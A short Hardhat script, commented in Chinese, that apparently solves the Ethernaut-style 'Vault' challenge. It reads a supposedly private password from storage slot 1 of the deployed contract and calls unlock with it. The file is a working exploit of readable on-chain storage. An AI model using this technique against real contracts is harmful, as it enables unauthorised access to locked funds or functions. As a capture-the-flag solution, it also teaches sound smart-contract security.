import hre from "hardhat";

async function main() {
    const vault_address = "0x8144cE10a19c56219Eea1F7F1d07444dB6D82EE2";
    
    const vault = await hre.ethers.getContractAt("Vault", vault_address);

    console.log("目前金庫鎖的狀態: ", await vault.locked());
    console.log(`Vault is ${(await vault.locked()) ? "LOCKED" : "UNLOCKED" }`); 

    // 調查變數存在區塊鏈的 storage slot 
    // Solidity 會將變數按宣告順序儲存到 Storage slot 當中
    // 關於 getStraoge 的用法，可以參考 ethers.js 的官方文件
    // https://github.com/ethers-io/ethers.js/blob/main/src.ts/providers/provider.ts
    // 舊稱 getStorageAt，新稱 getStorage
    const storageSlot = 1;
    const password = await hre.ethers.provider.getStorage(vault_address, storageSlot);
    console.log("password: ", password);

    // 解鎖
    await vault.unlock(password);

    console.log(`Vault is ${(await vault.locked()) ? "LOCKED" : "UNLOCKED" }`); 


}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });